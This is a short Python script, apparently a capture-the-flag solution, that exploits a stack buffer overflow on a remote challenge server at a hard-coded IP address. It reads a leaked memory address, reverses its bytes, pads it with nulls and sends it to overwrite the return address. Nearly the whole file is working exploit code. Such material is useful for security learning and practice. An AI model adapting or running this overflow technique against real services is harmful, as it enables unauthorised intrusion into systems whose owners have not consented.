import socket

#Recursive method to reverse hex pairs
def reverse_hex(hex):
    if(len(hex)<= 2):
        return hex
    else:
        return reverse_hex(hex[2:])+hex[0:2]

#overflow up to address
ones = "1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"

#Create socket and connect to challenge
sock = socket.socket()
sock.connect(('34.208.211.186', 4323))

#Recieve I/O
resp = sock.recv(1024)
print(resp)

#trim excess off of string
resp = resp[+47:-2]
print("address: " + resp)

#Reverse hex, decode as hex.
resp = reverse_hex(resp)

payload = ""
for i in range(0,298):
    payload += "00"

payload = payload+resp+resp
payload = payload.decode("hex")
print('payload: '+ payload)

bogus = raw_input('Send payload? ')
#send response and '\n' to prevent blocking
sock.send(payload)
sock.send("\n\n\n\n\n\n")

#Recieve and print response
resp = sock.recv(1024)
print(resp)
